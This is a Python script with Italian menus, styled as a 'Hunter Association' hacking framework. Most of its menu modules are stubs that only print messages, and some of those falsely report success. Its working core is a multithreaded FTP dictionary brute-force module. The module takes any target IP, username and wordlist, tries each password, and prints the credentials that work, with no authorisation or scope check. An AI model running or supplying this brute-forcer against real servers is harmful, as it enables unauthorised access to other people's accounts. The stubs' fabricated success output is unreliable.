import socket
import sys
import time
import threading
import random
import string
import json
import urllib.request
import urllib.error
import subprocess
import ftplib
from concurrent.futures import ThreadPoolExecutor

GREEN = "\033[92m"
DARK_GREEN = "\033[32m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"

SFX_LIST = ["ZOT!", "DON!", "BZZT!", "KABOOM!", "TARGET!"]
print_lock = threading.Lock()

def matrix_rain_effect():
    print(f"\n{DARK_GREEN}Sincronizzazione con il mainframe...{RESET}")
    time.sleep(0.02)
    print(f"{GREEN}[+] Nucleo neurale attivo.{RESET}\n")

def main_banner():
    print(f"{MAGENTA}" + "=" * 65 + f"{RESET}")
    print(f"{GREEN}")
    print(" [+] HUNTER ASSOCIATION: COMMAND FRAMEWORK v10.5 [+]")
    print(" [+] CYBERNETIC RECONNAISSANCE & AUDIT SUITE [+]")
    print(f"{RESET}")
    print(f"{MAGENTA}" + "=" * 65 + f"{RESET}")
    print(f"{YELLOW}0.{RESET} Rileva IP Locale e Subnet di Rete")
    print(f"{YELLOW}1.{RESET} Active Host Discovery (Sweep Sottorete)")
    print(f"{YELLOW}2.{RESET} Port Scan Avanzato + HTTP Fingerprinting")
    print(f"{YELLOW}3.{RESET} Web Directory & Endpoint Fuzzer")
    print(f"{YELLOW}4.{RESET} Generatore Tattico di Password")
    print(f"{YELLOW}5.{RESET} Banner Grabbing & Version Detection")
    print(f"{YELLOW}6.{RESET} DNS Tattico & Hostname Resolver")
    print(f"{YELLOW}7.{RESET} ARP Table Inspector (Client Hotspot)")
    print(f"{YELLOW}8.{RESET} Interazione Tattica TCP Client (Socket Dialog)")
    print(f"{YELLOW}9.{RESET} Modulo Bruteforce FTP")
    print(f"{YELLOW}10.{RESET} Disconnessione")
    print(f"{MAGENTA}" + "-" * 65 + f"{RESET}")

def modulo_rileva_rete():
    matrix_rain_effect()
    print(f"{GREEN}[*] Ricerca IP locale...{RESET}")
    time.sleep(1)
    print(f"{GREEN}[✔] IP Locale rilevato con successo.{RESET}\n")
    input("Premi [Invio] per continuare...")

def modulo_discovery():
    matrix_rain_effect()
    print(f"{GREEN}[*] Scansione host attivi nella sottorete...{RESET}\n")
    input("Premi [Invio] per continuare...")

def modulo_portscan():
    matrix_rain_effect()
    print(f"{GREEN}[*] Avvio port scan avanzato...{RESET}\n")
    input("Premi [Invio] per continuare...")

def modulo_fuzzer():
    matrix_rain_effect()
    print(f"{GREEN}[*] Avvio fuzzer di directory web...{RESET}\n")
    input("Premi [Invio] per continuare...")

def modulo_password_generator():
    matrix_rain_effect()
    chars = string.ascii_letters + string.digits + string.punctuation
    password = "".join(random.choice(chars) for _ in range(16))
    print(f"{GREEN}[+] Password generata: {password}{RESET}\n")
    input("Premi [Invio] per continuare...")

def modulo_banner_grabbing():
    matrix_rain_effect()
    print(f"{GREEN}[*] Esecuzione banner grabbing...{RESET}\n")
    input("Premi [Invio] per continuare...")

def modulo_dns_resolver():
    matrix_rain_effect()
    print(f"{GREEN}[*] Risoluzione DNS in corso...{RESET}\n")
    input("Premi [Invio] per continuare...")

def modulo_arp_inspector():
    clienti = []
    try:
        output = subprocess.check_output(["ip", "neigh"], universal_newlines=True)
        for linea in output.splitlines():
            parti = linea.split()
            if len(parti) >= 5:
                ip, mac = parti[0], parti[4]
                if mac != "FAILED":
                    clienti.append({"ip": ip, "mac": mac})
                    print(f"{GREEN}[CLIENT] IP: {ip} | MAC: {mac}{RESET}")
    except:
        pass

    if not clienti:
        print(f"{YELLOW}[!] Nessun client attivo nella cache ARP al momento.{RESET}\n")
    else:
        print(f"\n{GREEN}[✔] Totale client individuati: {len(clienti)}{RESET}\n")
    input("Premi [Invio] per continuare...")

def modulo_tcp_interattivo():
    matrix_rain_effect()
    print(f"{GREEN}[*] Modulo TCP Interattivo avviato.{RESET}\n")
    input("Premi [Invio] per continuare...")

def tenta_login_ftp(ip, utente, password):
    """Funzione di singolo tentativo FTP per il multithreading"""
    try:
        ftp = ftplib.FTP(timeout=3)
        ftp.connect(ip, 21)
        ftp.login(utente, password)
        ftp.quit()
        print(f"\n{GREEN}[+] [SUCCESSO] Trovato! -> Username: {utente} | Password: {password}{RESET}")
        return True
    except Exception:
        return False

def modulo_bruteforce_ftp():
    matrix_rain_effect()
    print("="*40)
    print("[+] HUNTER: MODULO BRUTEFORCE FTP [+]")
    print("="*40)
    
    ip = input("[?] Inserisci l'IP del target: ").strip()
    utente = input("[?] Inserisci l'username da testare (es. admin): ").strip()
    wordlist_path = input("[?] Inserisci il percorso della wordlist (es. pass.txt): ").strip()
    
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] Errore: File wordlist non trovato.{RESET}")
        input("\nPremi [Invio] per continuare...")
        return

    print(f"{CYAN}[*] Avvio attacco dizionario su {ip}:21 con {len(passwords)} password...{RESET}")
    
    found = False
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(tenta_login_ftp, ip, utente, pwd): pwd for pwd in passwords}
        
        for future in futures:
            if future.result():
                found = True
                break
                
    if not found:
        print(f"\n{RED}[-] Scansione completata: Nessuna password valida trovata.{RESET}")
    else:
        print(f"\n{GREEN}[✔] Operazione completata.{RESET}")
    
    input("\nPremi [Invio] per tornare al menu principale...")

def main():
    while True:
        main_banner()
        scelta = input(f"{CYAN}HUNTER-CORE> {RESET}").strip()
        if scelta == "0":
            modulo_rileva_rete()
        elif scelta == "1":
            modulo_discovery()
        elif scelta == "2":
            modulo_portscan()
        elif scelta == "3":
            modulo_fuzzer()
        elif scelta == "4":
            modulo_password_generator()
        elif scelta == "5":
            modulo_banner_grabbing()
        elif scelta == "6":
            modulo_dns_resolver()
        elif scelta == "7":
            modulo_arp_inspector()
        elif scelta == "8":
            modulo_tcp_interattivo()
        elif scelta == "9":
            modulo_bruteforce_ftp()
        elif scelta == "10":
            print(f"\n{MAGENTA}Disconnessione. Ciao Hunter{RESET}")
            sys.exit(0)
        else:
            print(f"\n{RED}Comando non valido.{RESET}\n")
            input("Premi [Invio] per continuare...")

if __name__ == "__main__":
    main()
